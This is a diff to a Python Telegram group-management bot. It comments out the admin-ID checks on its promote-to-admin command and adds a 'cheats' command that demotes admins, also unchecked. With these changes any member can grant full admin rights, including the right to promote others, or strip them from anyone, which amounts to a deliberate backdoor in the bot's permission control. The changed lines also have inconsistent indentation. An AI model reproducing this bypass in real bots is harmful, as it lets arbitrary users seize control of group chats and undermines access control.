@@ -269,10 +269,19 @@ def send_message(message):
         bot.delete_message(message.chat.id, message.message_id)
   except:
         bot.send_message(message.chat.id, '<b>error</b>', parse_mode='HTML')
-
+        
+#dw cheats
+ elif message.text.lower() == "admin > none = w.reply":
+   try:
+#     if message.from_user.id in adminsid.admins_id:
+        bot.promote_chat_member(message.chat.id, message.reply_to_message.from_user.id, can_delete_messages=None, can_pin_messages=None, can_restrict_members=None, can_manage_chat=None, can_manage_voice_chats = None, can_promote_members=None, can_edit_messages = None)
+        bot.send_message(message.chat.id, f'<b> {message.reply_to_message.from_user.first_name} </b> admindan olindingiz',parse_mode='HTML')
+        bot.delete_message(message.chat.id, message.message_id)
+   except:
+        bot.send_message(message.chat.id, '<b>error</b>', parse_mode='HTML')
 
  elif message.text.lower() == "admin = w.reply":
-    if message.from_user.id in adminsid.admins_id:
+#     if message.from_user.id in adminsid.admins_id:
         bot.promote_chat_member(message.chat.id, message.reply_to_message.from_user.id,can_delete_messages=True, can_pin_messages=True, can_restrict_members=True,  can_promote_members=True, can_change_info=True, can_invite_users = True)
         bot.send_message(message.chat.id, f'<b> {message.reply_to_message.from_user.first_name} </b> successfully you are admin', parse_mode='HTML')
         bot.delete_message(message.chat.id, message.message_id)
